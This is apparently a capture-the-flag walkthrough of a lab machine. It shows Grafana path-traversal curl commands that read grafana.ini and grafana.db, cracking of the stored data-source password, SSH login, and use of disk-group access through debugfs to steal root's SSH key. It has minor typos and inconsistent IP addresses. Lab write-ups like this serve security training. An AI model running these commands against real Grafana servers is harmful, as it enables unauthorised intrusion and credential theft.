---
title: Fanatastic PGP walkthrough
description: Target - Fanatastic, OS - Linux, Difficulty - Very Hard
readTime: 15 min read
image: ../assets/images/fnts/grfna.png
date: 01-06-2026
---

---

#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn -oN Fanatastic-nmap 192.168.132.181

Nmap scan report for 192.168.132.181
Host is up (0.33s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Discovered Grafana Version 8.3.0 running on port 3000

![web-graf](/1dragon/assets/images/fnts/Pasted%20image%2020260108095102.png)

Discovered Prometheus on port 9090. This collects and stores time-series metrics data from targets like servers or applications.

![prometheus](/1dragon/assets/images/fnts/Pasted%20image%2020260108095447.png)
searchsploit had an exploit `50581.py` in exploit db.

![searchsplooit](/1dragon/assets/images/fnts/Pasted%20image%2020260108101156.png)
A web search about file paths for grafana config file and grafana database file showed that they exist in the following directories.
```
/etc/grafana/grafana.ini - Stores the config
/var/lib/grafana/grafana.db - DB file used by Grafana
```

With the directory locations for the files known used it with the exploit as inputs and fetched the contents of the files.

![exp](/1dragon/assets/images/fnts/Pasted%20image%2020260108215125.png)

Upon searching about this vulnerability discovered  a list plugins vulnerable [here](https://grafana.com/blog/grafana-8-3-1-8-2-7-8-1-8-and-8-0-7-released-with-high-severity-security-fix/)

However the exploit can also be run manually with path to vulnerable plugins and the file to be fetched because it is a File Directory Traversal attack. 

---

#### ***Initial Access***


```
curl --path-as-is http://192.168.132.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini > grafana.db

curl --path-as-is http://192.168.225.181:3000/public/plugins/loki/../../../../../../../../var/lib/grafana/grafana.db > grafana.db
```

The file command identified the database file is a sqlite3 db file.

```
file grafana.db 

grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 396, database pages 187, cookie 0x138, schema 4, UTF-8, version-valid-for 396
```
`.tables` showed all of the tables in the database.

![tabs](/1dragon/assets/images/fnts/Pasted%20image%2020260108220659.png)

The table data_source had a password hash for user sysadmin which is data source for grafana
as discovered earlier that prometheus provides the metric from servers and apps and grafana uses it for dashboard generation and analysis.

![data_src](/1dragon/assets/images/fnts/Pasted%20image%2020260108220747.png)
The user table had admin user hash which wasn't useful as a lead.

![](/1dragon/assets/images/fnts/Pasted%20image%2020260108221103.png)

With the discovered password hash for user sysadmin a secret key is was required to crack the hash. The secret key was found in the grafana.ini file 

Cracked the hash with a dedicated [script](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798) as follows

![dcrpt](/1dragon/assets/images/fnts/Pasted%20image%2020260108211523.png)
With the password identified tried to log into the target as user sysadmin via ssh.

`ssh sysadmin@192.168.225.181`

Logged in as sysadmin and captured the local.txt.

---

#### ***Privilege Escalation***

`id` showed that the user sysadmin is in `(disk)` group. That is a way to escalate privilege.

![local](/1dragon/assets/images/fnts/Pasted%20image%2020260108204707.png)

While the user sysadmin is in (disk) group executed `dh -h ` and identified the actual storage `\` which is usually the Filesystem named as `/dev/sda2`

![dfh](/1dragon/assets/images/fnts/Pasted%20image%2020260108205023.png)

With debugfs on the `dev/sda2` fetched the id_rsa for root user.

![dbgfs](/1dragon/assets/images/fnts/Pasted%20image%2020260108205823.png)

Copied the private ket into a file and modified the file permission with `chmod 600 id_rsa`
and logged in as root .
`ssh -i id_rsa root@192.168.225.181`

![root](/1dragon/assets/images/fnts/Pasted%20image%2020260108205752.png)

Captured the root flag under /root/proof.txt

---
										Target compromised - |^| ^ ( |< 3 D